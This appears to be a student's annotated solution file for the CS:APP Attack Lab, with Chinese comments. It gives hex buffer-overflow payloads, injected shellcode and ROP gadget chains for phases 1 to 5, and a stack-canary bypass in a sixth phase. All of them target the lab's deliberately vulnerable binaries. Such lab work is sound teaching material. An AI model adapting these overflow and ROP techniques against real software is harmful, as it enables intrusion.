Cookie: 0x6a2937f1
1029400652zy

//转码并以文件输入
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget -q -i exploit-raw.txt

//编译为二进制文件并反汇编为汇编文件
gcc -c sample.s
objdump -d sample.o > sample.d

//gdb上运行
gdb ./ctarget
r -q -i exploit-raw.txt

//////////////////////////////phase1
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
f6 19 40 00 00 00 00 00
//把返回地址冲掉
//返回地址是 0x00000000004019f6
//存储字符串：字符数组，前面的元素放在低地址，后的放在高地址
//低f6 19 40 00 00 00 00 00高
//地址的读取：小端法，小的有效位在低地址（前），大的有效位在高地址（后）
//大00000000004019f6小


////////////////////////////phase2，两种解法
	//返回地址冲成栈中位置，栈里是自己的代码
	//mov+push+ret
	48 c7 c7 f1 37 29 6a
	68 24 1a 40 00
	c3 
	00
	00 00 00
	00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	68 bc 62 55 00 00 00 00

//或者在后面再加一个地址，就不必push，直接ret
//mov+ret
48 c7 c7 f1 37 29 6a
c3 
00
00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 bc 62 55 00 00 00 00
24 1a 40 00 00 00 00 00
//或者直接修改(%rsp)

////////////////////////////////////////phase3
//不仅冲了返回地址，还把字符串放在后头
//mov+ret
48 c7 c7 b0 bc 62 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 bc 62 55 00 00 00 00
3b 1b 40 00 00 00 00 00
36 61 32 39 33 37 66 31
00
//字符串放最高处，防止栈往下长破坏它

///////////////////////////////////phase4
//在farm中找到可用指令，组成一个序列
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
12 1c 40 00 00 00 00 00//pop rax
f1 37 29 6a 00 00 00 00//cookie
1f 1c 40 00 00 00 00 00//rax rdi
b2 19 40 00 00 00 00 00//touch2


/////////////////////////////////phase5
//关键是取出栈指针和实现加法，即要设法设置rdi的位置是栈指针+某个常数
//加法是一个比较间接的过程，注意64位mov传地址，32位mov传常数

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
12 1c 40 00 00 00 00 00//pop rax
20 00 00 00 00 00 00 00//rax = 0x20
9e 1c 40 00 00 00 00 00//eax edx
4c 1c 40 00 00 00 00 00//edx ecx
1e 1d 40 00 00 00 00 00//ecx esi
84 1c 40 00 00 00 00 00//rsp rax
1f 1c 40 00 00 00 00 00//rax rdi
45 1c 40 00 00 00 00 00//rsi+rdi rax
1f 1c 40 00 00 00 00 00//rax rdi
c9 1a 40 00 00 00 00 00//touch3
36 61 32 39 33 37 66 31//cookie
00


/////////////////////////////////phase6
//栈的结构：这一帧0x128高，前0x80是空的，get从0x80开始写，0x80到0x100是复制的源，最后8字节保存了个寄存器，再往前8字节是金丝雀
//不能冲到金丝雀位置
//用了一个复制作为破绽：本来是把0x80开始，0x80字节长度的空间复制到0x00开始的位置
//但是这个0x00开始的位置实际上是0x00+rcx的值（rcx在0x104取了一个四字节的值，一开始这里是0）
//所以，我们要额外做的事情就是把这个0x104的0冲成我们想要的值：0x128



//0x120-0x128：寄存器
//0x118-0x120：金丝雀
//
//0x104：rcx要取的值
//0x100
//复制源区域
//0x80
//复制目标区域
//0




12 1c 40 00 00 00 00 00
20 00 00 00 00 00 00 00
9e 1c 40 00 00 00 00 00
4c 1c 40 00 00 00 00 00
1e 1d 40 00 00 00 00 00
84 1c 40 00 00 00 00 00
1f 1c 40 00 00 00 00 00
45 1c 40 00 00 00 00 00
1f 1c 40 00 00 00 00 00
c9 1a 40 00 00 00 00 00
36 61 32 39 33 37 66 31//到结尾长度是0x58
00 00 00 00 00 00 00 00//这里还有一个字符串结尾的00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00//这里结尾长度0x80，位置0x100
28 01 00 00 28 01 00 00//不知道具体在哪里，干脆就全都写了
28 01 00 00 28 01 00 00
